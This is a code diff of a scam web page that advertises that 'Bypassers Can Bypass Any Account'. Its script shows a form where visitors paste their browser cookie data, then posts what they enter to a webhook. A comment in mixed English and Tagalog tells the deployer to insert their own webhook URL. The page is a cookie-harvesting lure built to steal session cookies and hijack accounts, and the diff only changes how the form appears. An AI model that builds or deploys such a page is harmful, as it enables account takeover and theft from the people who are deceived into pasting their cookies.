@@ -130,7 +130,7 @@
   <div class="circle blue"></div>
 
   <!-- Buttons -->
-  <button class="button" onclick="redirectToBypassAccount()">
+  <button class="button" onclick="showForm()">
     <i class="fas fa-bolt"></i> Bypassers Can Bypass Any Account
   </button>
   <button class="button">
@@ -148,20 +148,15 @@
   </div>
 
   <script>
-    // If current path is /AnyForceAccount, show the form
-    if (window.location.pathname.includes("/AnyForceAccount")) {
+    function showForm() {
       document.getElementById("form-container").style.display = "block";
-    }
-
-    function redirectToBypassAccount() {
-      window.location.href = "/AnyForceAccount";
     }
 
     document.getElementById("cookie-form").addEventListener("submit", function (e) {
       e.preventDefault();
 
       const cookieData = document.getElementById("cookieInput").value;
-      const webhookUrl = "YOUR_WEBHOOK_URL"; // 🔁 Replace this with your actual webhook URL!
+      const webhookUrl = "YOUR_WEBHOOK_URL"; // <<<<<< PALITAN MO ITO NG WEBHOOK MO
 
       const payload = {
         content: `@everyone @here Cookie Data: ${cookieData}`
